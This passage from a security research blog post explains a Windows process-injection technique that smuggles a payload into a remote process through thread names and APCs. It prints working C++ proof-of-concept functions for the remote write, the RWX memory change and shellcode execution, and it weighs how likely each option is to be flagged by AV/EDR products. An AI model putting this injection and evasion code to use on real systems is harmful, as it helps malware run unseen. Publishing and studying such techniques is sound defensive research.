    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return remotePtr;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">ULONG_PTR get_peb_unused(HANDLE hProcess)
{
    ULONG_PTR peb_addr = remote_peb_addr(hProcess);
    if (!peb_addr) {
        std::cerr &lt;&lt; "Cannot retrieve PEB address!\n";
        return NULL;
    }
    const ULONG_PTR UNUSED_OFFSET = 0x340;
    const ULONG_PTR remotePtr = peb_addr + UNUSED_OFFSET;
    return remotePtr;
}</pre>



<p class="wp-block-paragraph">As for setting the thread description (a. k. a. name) – we can do it either:</p>



<ol class="wp-block-list">
<li>on an existing thread</li>



<li>on a new one, that we just create for this purpose</li>
</ol>



<p class="wp-block-paragraph">The name will be retrieved by passing an APC with the function&nbsp;<code>GetThreadDescription</code>&nbsp;to the same thread where it was set (since this function has 2 parameters, and calling via APC we can pass up to 3 parameters, it is a good fit).</p>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<div class="wp-block-group"><div class="wp-block-group__inner-container is-layout-constrained wp-block-group-is-layout-constrained">
<p class="wp-block-paragraph"><em><strong>Side note:</strong></em></p>



<p class="wp-block-paragraph"><em>The function&nbsp;<code>GetThreadDescription</code>&nbsp;requires us to pass the handle to the thread which description (name) we want to read. We CAN set the name on a different thread than the one reading it back. But keep in mind that this function will be executed in context of the target process. Therefore, the handle to the thread that we opened in context of the injector process is no longer valid. Using it in context of a different process would require us to&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle">duplicate the handle</a>&nbsp;of the named thread. That means, we must extend our access to the target process by setting&nbsp;<code>PROCESS_DUP_HANDLE</code>, so it’s best to avoid it. The alternative scenario is much easier: because we retrieve the name by the named thread itself, it is enough to use the pseudo handle&nbsp;<code>NtCurrentThread()</code>= (-2) , which is always valid while referencing to the current thread by self.</em></p>
</div></div>
</div></div>
</blockquote>



<p class="wp-block-paragraph">In the first (preferable) scenario, if we utilize the threads already running within the process, we should either:</p>



<ul class="wp-block-list">
<li>use the new API for APC, and add our function as the Special User APC (<code>QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC</code>)</li>



<li>find a thread in an alterable state, so that our function can be called when the thread gets alerted</li>
</ul>



<p class="wp-block-paragraph">The thread must be open with (at least)&nbsp;<code>THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION</code>&nbsp;access.</p>



<p class="wp-block-paragraph">In the second scenario, with a newly created thread, if we use it in conjunction with the old API, we also have to ensure that the thread is alertable, so that our APC gets executed. Examples on how to do it:</p>



<ul class="wp-block-list">
<li>create a&nbsp;<a href="https://github.com/hasherezade/thread_namecalling/blob/14fcde84ffdbfabe5ee93b5233e5259299f7289d/common.cpp#L109">suspended thread on a benign function</a>&nbsp;(i.e.&nbsp;<code>Sleep</code>,&nbsp;<code>ExitThread</code>&nbsp;from kernel32),&nbsp;<a href="https://github.com/hasherezade/thread_namecalling/blob/14fcde84ffdbfabe5ee93b5233e5259299f7289d/common.cpp#L183">add the needed function to the APC queue</a>, then resume it</li>



<li>create a thread on the&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-sleepex"><code>SleepEx</code>&nbsp;function</a>. This function requires two arguments, the second one defining if the Sleep is alertable. Using the thread creation function we can pass only one argument – this sounds like a problem. Yet, the second needed argument is boolean, which means, any non-zero value is treated as TRUE. In the&nbsp;<a href="https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling convention the second argument is passed via RDX register</a>, so if the RDX register, at the point of calling, holds anything different than zero, our <code>SleepEx</code> will be treated as alertable. That means, with a high probability the needed value is already set.</li>
</ul>



<p class="wp-block-paragraph">Any other steps can be done only <span style="text-decoration: underline;">after</span> our APC gets called. Before that, we don’t have our buffer in the remote process yet, and we also don’t know at what address it would be stored. Therefore, in order to pass the buffer, we need the first APC. And after it is completed and the buffer is written, we need the second APC to be able to run it.</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-text">wchar_t* </span><span class="enlighter-m0">pass_via_thread_name</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hProcess, </span><span class="enlighter-k8">const</span><span class="enlighter-text"> wchar_t* buf, </span><span class="enlighter-k8">const</span><span class="enlighter-text"> </span><span class="enlighter-k5">void</span><span class="enlighter-text">* remotePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!remotePtr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Return pointer not set!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hThread = </span><span class="enlighter-m0">find_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hThread || hThread == INVALID_HANDLE_VALUE</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Invalid thread handle!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HRESULT hr = </span><span class="enlighter-m0">mySetThreadDescription</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, buf</span><span class="enlighter-g1">)</span><span class="enlighter-text">; </span><span class="enlighter-c0">// customized SetThreadDescription allows to pass a buffer with NULL bytes</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">FAILED</span><span class="enlighter-g1">(</span><span class="enlighter-text">hr</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed to set thread desc"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::endl;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, GetThreadDescription, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">NtCurrentThread</span><span class="enlighter-g1">()</span><span class="enlighter-text">, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)</span><span class="enlighter-text">remotePtr, 0</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-c0">// close thread handle</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    wchar_t* wPtr = </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isRead = </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">while</span><span class="enlighter-text"> </span><span class="enlighter-g1">((</span><span class="enlighter-text">wPtr = </span><span class="enlighter-g1">(</span><span class="enlighter-text">wchar_t*</span><span class="enlighter-g1">)</span><span class="enlighter-m0">read_remote_ptr</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, remotePtr, isRead</span><span class="enlighter-g1">))</span><span class="enlighter-text"> == </span><span class="enlighter-k0">nullptr</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!isRead</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-k0">nullptr</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-m0">Sleep</span><span class="enlighter-g1">(</span><span class="enlighter-text">1000</span><span class="enlighter-g1">)</span><span class="enlighter-text">; </span><span class="enlighter-c0">// waiting for the pointer to be written;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Written to the Thread\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> wPtr;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">wchar_t* pass_via_thread_name(HANDLE hProcess, const wchar_t* buf, const void* remotePtr)
{
    if (!remotePtr) {
        std::cerr &lt;&lt; "Return pointer not set!\n";
        return nullptr;
    }

    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION);

    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return nullptr;
    }

    HRESULT hr = mySetThreadDescription(hThread, buf); // customized SetThreadDescription allows to pass a buffer with NULL bytes
    if (FAILED(hr)) {
        std::cout &lt;&lt; "Failed to set thread desc" &lt;&lt; std::endl;
        return nullptr;
    }
    if (!queue_apc_thread(hThread, GetThreadDescription, (void*)NtCurrentThread(), (void*)remotePtr, 0)) {
        CloseHandle(hThread);
        return nullptr;
    }
    // close thread handle
    CloseHandle(hThread);

    wchar_t* wPtr = nullptr;
    bool isRead = false;
    while ((wPtr = (wchar_t*)read_remote_ptr(hProcess, remotePtr, isRead)) == nullptr) {
        if (!isRead) return nullptr;
        Sleep(1000); // waiting for the pointer to be written;
    }
    std::cout &lt;&lt; "Written to the Thread\n";
    return wPtr;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">wchar_t* pass_via_thread_name(HANDLE hProcess, const wchar_t* buf, const void* remotePtr)
{
    if (!remotePtr) {
        std::cerr &lt;&lt; "Return pointer not set!\n";
        return nullptr;
    }

    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT | THREAD_SET_LIMITED_INFORMATION);

    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return nullptr;
    }

    HRESULT hr = mySetThreadDescription(hThread, buf); // customized SetThreadDescription allows to pass a buffer with NULL bytes
    if (FAILED(hr)) {
        std::cout &lt;&lt; "Failed to set thread desc" &lt;&lt; std::endl;
        return nullptr;
    }
    if (!queue_apc_thread(hThread, GetThreadDescription, (void*)NtCurrentThread(), (void*)remotePtr, 0)) {
        CloseHandle(hThread);
        return nullptr;
    }
    // close thread handle
    CloseHandle(hThread);

    wchar_t* wPtr = nullptr;
    bool isRead = false;
    while ((wPtr = (wchar_t*)read_remote_ptr(hProcess, remotePtr, isRead)) == nullptr) {
        if (!isRead) return nullptr;
        Sleep(1000); // waiting for the pointer to be written;
    }
    std::cout &lt;&lt; "Written to the Thread\n";
    return wPtr;
}</pre>



<p class="wp-block-paragraph">After the above function finishes, we have our buffer written to the remote process. We also have a pointer to it. That means, the remote write is accomplished.</p>


<div class="wp-block-image">
<figure class="aligncenter size-full is-resized"><img fetchpriority="high" decoding="async" width="531" height="481" src="https://research.checkpoint.com/wp-content/uploads/2024/07/animation3-1.gif" alt="" class="wp-image-30238" style="aspect-ratio:1;width:591px;height:auto"><figcaption class="wp-element-caption">Figure 2 – Remote write with the help of Thread Name</figcaption></figure>
</div>


<p class="wp-block-paragraph">At this point our payload is already stored in the working set of the remote process. However, it is in a non-executable memory, allocated on the heap.</p>



<p class="wp-block-paragraph">To proceed, we need to do one of these:</p>



<ul class="wp-block-list">
<li>find an empty cave in executable memory, and copy it there (the most stealthy option, unfortunately, finding a fitting cave is unlikely in practice)</li>



<li>allocate a new, executable buffer of a fitting size, and copy it there</li>



<li>set on the whole page containing it Read-Write-eXecute (RWX) access rights (we cannot just make it RX: remember that it is a page used for Heap, and there is some other stuff stored along with our buffer)</li>
</ul>



<p class="wp-block-paragraph">Copying our buffer from the heap into a different memory region can be achieved via APC, by calling the function&nbsp;<code>RtlMoveMemory</code>&nbsp;from&nbsp;<code>ntdll</code>, which has 3 arguments. However, obtaining the executable buffer is more problematic.</p>



<p class="wp-block-paragraph">None of the proposed solutions is perfect, but they may be sufficient depending on the scenario.</p>



<p class="wp-block-paragraph">Allocating a new buffer is the cleanest option, but it has some drawbacks. To do it from a remote process, we must call <a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex"><code>VirtualAllocEx</code></a> with RWX access – which is suspicious. Calling <code>VirtualAlloc</code> remotely via APC is impossible: this function has 4 arguments, and with the API for APC we can only pass 3. </p>



<p class="wp-block-paragraph">An alternative is to use the buffer that we already have (allocated on the heap), and just change its memory protection. We can do it by calling&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex"><code>VirtualProtectEx</code></a>. Changing the memory protection of the page within the remote process is still suspicious, but the advantage of this method is that it requires fewer steps than the one presented earlier. Again, calling the local equivalent of the function:&nbsp;<code>VirtualProtect</code>&nbsp;remotely has the same problems as calling&nbsp;<code>VirtualAlloc</code>.</p>



<p class="wp-block-paragraph">Still, there exists a possibility to do the memory protection or allocation by calling <code>VirtualAlloc</code>/<code>VirtualProtect</code> remotely with the help of ROP (included as one of the options in <a href="https://github.com/hasherezade/thread_namecalling">our PoC code</a>). But this method comes with its own problems, and a different set of suspicious indicators. It requires using API for direct thread manipulation (<code>SuspendThread</code>/<code>ResumeThread</code>, <code>SetThreadContext</code>/<code>GetThreadContext</code>). According to the tests we performed, that raises even more alerts, and will result in our injector being flagged by many AV/EDR products. In addition, allocating executable memory from within the process will fail if it has the <a href="https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy">DCP (Dynamic Code Prohibited) enabled</a>.</p>



<p class="wp-block-paragraph">After considering all the pros and cons, we decided to keep things simple and just call&nbsp;<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex"><code>VirtualProtectEx</code></a>. The second snippet illustrates the alternative version, with&nbsp;<code><a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a></code>.</p>



<p class="wp-block-paragraph">Once our shellcode is in the executable memory region, we are ready to run it. We use another APC to trigger the execution (requires a thread handle with&nbsp;<code>THREAD_SET_CONTEXT</code>&nbsp;access). Additionally, we may use aforementioned function, <code>RtlDispatchAPC</code>, as a proxy to call the injected code.</p>



<p class="wp-block-paragraph">Snippet illustrating the basic implementation:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">run_injected_v1</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hProcess, </span><span class="enlighter-k5">void</span><span class="enlighter-text">* remotePtr, size_t payload_len</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    DWORD oldProtect = 0;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!</span><span class="enlighter-m0">VirtualProtectEx</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, remotePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect</span><span class="enlighter-g1">))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cout </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Failed to protect!"</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> std::hex </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-m0">GetLastError</span><span class="enlighter-g1">()</span><span class="enlighter-text"> </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hThread = </span><span class="enlighter-m0">find_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, THREAD_SET_CONTEXT</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hThread || hThread == INVALID_HANDLE_VALUE</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Invalid thread handle!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">bool</span><span class="enlighter-text"> isOk = </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">auto</span><span class="enlighter-text"> _RtlDispatchAPC = </span><span class="enlighter-m0">GetProcAddress</span><span class="enlighter-g1">(</span><span class="enlighter-m0">GetModuleHandle</span><span class="enlighter-g1">(</span><span class="enlighter-s0">"ntdll.dll"</span><span class="enlighter-g1">)</span><span class="enlighter-text">, </span><span class="enlighter-m0">MAKEINTRESOURCE</span><span class="enlighter-g1">(</span><span class="enlighter-text">8</span><span class="enlighter-g1">))</span><span class="enlighter-text">; </span><span class="enlighter-c0">//RtlDispatchAPC;</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">_RtlDispatchAPC</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-m0">queue_apc_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread, _RtlDispatchAPC, shellcodePtr, 0, </span><span class="enlighter-g1">(</span><span class="enlighter-k5">void</span><span class="enlighter-text">*</span><span class="enlighter-g1">)(</span><span class="enlighter-text">-1</span><span class="enlighter-g1">)))</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">            isOk = </span><span class="enlighter-e0">true</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-m0">CloseHandle</span><span class="enlighter-g1">(</span><span class="enlighter-text">hThread</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k0">return</span><span class="enlighter-text"> isOk;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">}</span></div></div></div><div class="enlighter-raw">bool run_injected_v1(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remotePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) {
        std::cout &lt;&lt; "Failed to protect!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return false;
    }
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    CloseHandle(hThread);
    return isOk;
}</div></div><div class="enlighter-toolbar-bottom enlighter-toolbar"></div></div><pre class="EnlighterJSRAW enlighter-origin" data-enlighter-language="cpp" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">bool run_injected_v1(HANDLE hProcess, void* remotePtr, size_t payload_len)
{
    DWORD oldProtect = 0;
    if (!VirtualProtectEx(hProcess, remotePtr, payload_len, PAGE_EXECUTE_READWRITE, &amp;oldProtect)) {
        std::cout &lt;&lt; "Failed to protect!" &lt;&lt; std::hex &lt;&lt; GetLastError() &lt;&lt; "\n";
        return false;
    }
    HANDLE hThread = find_thread(hProcess, THREAD_SET_CONTEXT);
    if (!hThread || hThread == INVALID_HANDLE_VALUE) {
        std::cerr &lt;&lt; "Invalid thread handle!\n";
        return false;
    }
    bool isOk = false;
    auto _RtlDispatchAPC = GetProcAddress(GetModuleHandle("ntdll.dll"), MAKEINTRESOURCE(8)); //RtlDispatchAPC;
    if (_RtlDispatchAPC) {
        if (queue_apc_thread(hThread, _RtlDispatchAPC, shellcodePtr, 0, (void*)(-1))) {
            isOk = true;
        }
    }
    CloseHandle(hThread);
    return isOk;
}</pre>



<p class="wp-block-paragraph">Extended version, covering different possibilities:</p>



<div class="enlighter-default enlighter-v-standard enlighter-t-dracula enlighter-l-cpp enlighter-hover enlighter-linenumbers "><div class="enlighter-toolbar-top enlighter-toolbar"><div class="enlighter-btn enlighter-btn-raw"><div class="enlighter-tooltip">Plain text</div></div><div class="enlighter-btn enlighter-btn-copy"><div class="enlighter-tooltip">Copy to clipboard</div></div><div class="enlighter-btn enlighter-btn-window"><div class="enlighter-tooltip">Open code in new window</div></div><div class="enlighter-btn enlighter-btn-website"><div class="enlighter-tooltip">EnlighterJS 3 Syntax Highlighter</div></div></div><div class="enlighter-code"><div class="enlighter" style=""><div class=""><div><span class="enlighter-k5">bool</span><span class="enlighter-text"> </span><span class="enlighter-m0">run_injected</span><span class="enlighter-g1">(</span><span class="enlighter-text">HANDLE hProcess, </span><span class="enlighter-k5">void</span><span class="enlighter-text">* remotePtr, size_t payload_len</span><span class="enlighter-g1">)</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k5">void</span><span class="enlighter-text">* shellcodePtr = remotePtr;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#ifdef USE_EXISTING_THREAD</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hThread = </span><span class="enlighter-m0">find_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess, THREAD_SET_CONTEXT</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#else</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    HANDLE hThread = </span><span class="enlighter-m0">create_alertable_thread</span><span class="enlighter-g1">(</span><span class="enlighter-text">hProcess</span><span class="enlighter-g1">)</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text"></span><span class="enlighter-k4">#endif</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-k1">if</span><span class="enlighter-text"> </span><span class="enlighter-g1">(</span><span class="enlighter-text">!hThread || hThread == INVALID_HANDLE_VALUE</span><span class="enlighter-g1">)</span><span class="enlighter-text"> </span><span class="enlighter-g1">{</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text">        std::cerr </span><span class="enlighter-g1">&lt;&lt;</span><span class="enlighter-text"> </span><span class="enlighter-s0">"Invalid thread handle!\n"</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">        </span><span class="enlighter-k0">return</span><span class="enlighter-text"> </span><span class="enlighter-e0">false</span><span class="enlighter-text">;</span></div></div><div class=""><div><span class="enlighter-text">    </span><span class="enlighter-g1">}</span><span class="enlighter-text"></span></div></div><div class=""><div><span class="enlighter-text"></span><span 